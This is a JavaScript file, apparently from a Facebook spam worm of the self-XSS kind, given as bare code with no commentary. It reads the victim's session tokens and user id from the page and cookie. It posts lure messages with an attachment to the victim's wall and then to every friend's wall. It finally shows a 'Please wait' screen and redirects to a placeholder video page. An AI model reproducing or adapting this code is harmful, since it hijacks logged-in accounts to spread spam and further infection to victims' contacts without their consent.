var fanpageid = ['', '', ''];
var videourl = ['http://xxxxxxxxxxxxx/video.php', 'http://yyyyyyyyyyyyyyy/video.php'];
var message = ['WOW YOU GOTTA SEE THIS', 'HEY CHECK THIS OUT', 'YO CHECK THIS OUT'];

function spin(_0xf840x5) {
    return _0xf840x5[Math['floor'](Math['random']() * _0xf840x5['length'])];
};
var post_form_id = document['getElementsByName']('post_form_id')[0]['value'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/profile/composer.php?__a=1';
var paramswp = 'post_form_id=' + post_form_id + '&fb_dtsg=' + fb_dtsg + '&xhpc_composerid=u3bbpq_21&xhpc_targetid=' + user_id + '&xhpc_context=profile&xhpc_location=&xhpc_fbx=1&xhpc_timeline=&xhpc_ismeta=1&xhpc_message_text=' + spin(message) + '&xhpc_message=' + spin(message) + '&aktion=post&app_id=2309869772&attachment[params][0]=' + spin(fanpageid) + '&attachment[type]=18&composertags_place=&composertags_place_name=&composer_predicted_city=102186159822587&composer_session_id=1320586865&is_explicit_place=&audience[0][value]=80&composertags_city=&disable_location_sharing=false&nctr[_mod]=pagelet_wall&lsd&post_form_id_source=AsyncRequest&__user=' + user_id + '';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);
var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0xf840xd, _0xf840xe) {
            return _0xf840xd['index'] - _0xf840xe['index'];
        });
    };
};
for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/profile/composer.php?__a=1';
    var paramswp = 'post_form_id=' + post_form_id + '&fb_dtsg=' + fb_dtsg + '&xhpc_composerid=u2qr0v_15&xhpc_targetid=' + friends[i]['uid'] + '&xhpc_context=profile&xhpc_location=&xhpc_fbx=1&xhpc_timeline=&xhpc_ismeta=1&xhpc_message_text=' + spin(message) + '&xhpc_message=' + spin(message) + '&aktion=post&app_id=2309869772&attachment[params][0]=' + spin(fanpageid) + '&attachment[type]=18&composertags_place=&composertags_place_name=&composer_predicted_city=102186159822587&composer_session_id=1320585896&is_explicit_place=&audience[0][value]=80&composertags_city=&disable_location_sharing=false&nctr[_mod]=pagelet_wall&lsd&post_form_id_source=AsyncRequest&__user=' + user_id + '&';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
        if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
document['getElementById']('contentArea')['innerHTML'] = '<center><br><br><br><br><br><img src="http://i.imgur.com/Qofa7.gif" /><br />Please wait...</center>';
setTimeout('top.location=\'' + spin(videourl) + '\';', 30000);
